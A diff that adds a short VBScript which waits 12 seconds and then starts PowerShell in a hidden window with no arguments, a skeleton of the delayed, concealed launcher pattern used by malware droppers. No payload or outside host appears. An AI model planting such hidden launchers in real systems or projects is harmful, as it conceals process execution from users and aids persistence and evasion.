@@ -1,0 +1,3 @@
+Set atwo = WScript.CreateObject ("WScript.shell")
+wscript.sleep 12000
+atwo.run "powershell ", 0, False
